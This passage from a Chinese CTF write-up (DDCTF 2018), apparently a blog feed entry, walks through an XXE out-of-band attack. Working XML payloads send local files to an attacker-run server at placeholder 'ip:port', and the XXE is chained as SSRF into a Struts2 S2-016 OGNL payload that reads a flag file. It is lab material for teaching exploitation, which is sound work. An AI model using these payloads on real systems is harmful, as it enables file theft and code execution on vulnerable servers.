Overflow找到一个答案：<code>f5a5a608</code>。</p><p>&emsp;&emsp;登录后并没有发现特别的功能，但是代码里已经给了我们非常明显的提示：<code>xxe</code>攻击，因为它自身并没有回显，所以我们需要找到一个支持<code>xxe</code>外带数据的方法，解决方案就是：<code>xxe oob</code>。我们先在自己服务器上放置<code>evil.xml</code>，内容如下：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % int "&lt;!ENTITY &amp;#37; send SYSTEM 'http://ip:port/%file;'&gt;"&gt;</span><br><span class="line">%int;</span><br><span class="line">%send;</span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;ps: 上面的port是nc监听的端口，接着构造payload：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "file:///flag/hint.txt"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;发送过去：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/49.png" height="60%"><br></div><br>&emsp;&emsp;我们就能在服务器上收到信息：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/50.png" height="60%"><br></div><br>&emsp;&emsp;根据提示我们接着构造payload：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p>&emsp;&emsp;结果：</p><p><div align="center"><br>    <img src="/images/posts/ddctf/51.png" height="60%"><br></div><br>&emsp;&emsp;再来：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE ANY[</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action"&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % remote SYSTEM "http://ip:port/evil.xml"&gt;</span></span><br><span class="line"><span class="hljs-meta">%remote;</span></span><br><span class="line"><span class="hljs-meta"> %all;</span></span><br><span class="line"><span class="hljs-meta">%send;</span></span><br><span class="line"><span class="hljs-meta">]&gt;</span></span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/ddctf/52.png" height="60%"><br></div><br>&emsp;&emsp;这时候用到了题目的提示：</p><blockquote><p>提示：第二层关卡应用版本号为2.3.1</p></blockquote><p>&emsp;&emsp;所以我们找找<code>Struts2 2.3.1</code>版本的漏洞，<a href="https://www.zybuluo.com/Dukebf/note/821989" target="_blank">此篇文章</a>有较为详细的记载。</p><p>&emsp;&emsp;经过多次尝试后我们能利用的漏洞版本是<code>S2-016</code>，接着再去找漏洞脚本，一个能用的payload如下：<br><figure class="highlight xml hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="hljs-meta">&lt;!DOCTYPE data [</span></span><br><span class="line"><span class="hljs-meta">&lt;!ENTITY % file SYSTEM "http://tomcat_2:8080/hello.action?redirect:$&#123;#a=new java.io.FileInputStream('/flag/flag.txt'),#b=new java.io.InputStreamReader(#a),#c=new java.io.BufferedReader(#b),#d=new char[60],#c.read(#d),#matt=#context.get('com.opensymphony.xwork2.dispatcher.HttpServletResponse').getWriter(),#matt.println(#d),#matt.flush(),#matt.close()&#125;"&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">dtd</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">http:</span>//<span class="hljs-attr">ip:port</span>/<span class="hljs-attr">evil.xml</span>"&gt;</span></span><br><span class="line">%dtd; </span><br><span class="line">%all;]&gt;</span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&amp;send;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><div align="center"><br>    <img src="/images/posts/ddctf/53.png" height="60%"><br></div><br>&emsp;&emsp;在进行复现的时候经常会出现<code>IOException</code>，按照其他的writeup里的payload也是如此，这也有可能是环境问题导致的。</p><p>&emsp;&emsp;参考链接：</p><p>&emsp;&emsp;<a href="https://impakho.com/post/ddctf-2018-writeup" target="_blank">https://impakho.com/post/ddctf-2018-writeup</a></p><p>&emsp;&emsp;<a href="https://thief.one/2017/06/20/1/" target="_blank">https://thief.one/2017/06/20/1/</a></p><p>&emsp;&emsp;<a href="http://www.freebuf.com/articles/web/97833.html" target="_blank">http://www.freebuf.com/articles/web/97833.html</a></p><p>&emsp;&emsp;<a href="https://github.com/Eliteams/quick4j" target="_blank">https://github.com/Eliteams/quick4j</a></p><p>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;<br>&emsp;&emsp;</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
&lt;h2 id=&quot;我的博客&quot;&gt;&lt;a href=&quot;#我的博客&quot; class=&quot;headerlink&quot; title=&quot;我的博客&quot;&gt;&lt;/a&gt;我的博客&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;提示：&lt;a href=&quot;http://www.tar.gz&quot; 
      
    
    </summary>
    
    
      <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
    
  </entry>
  
</feed>
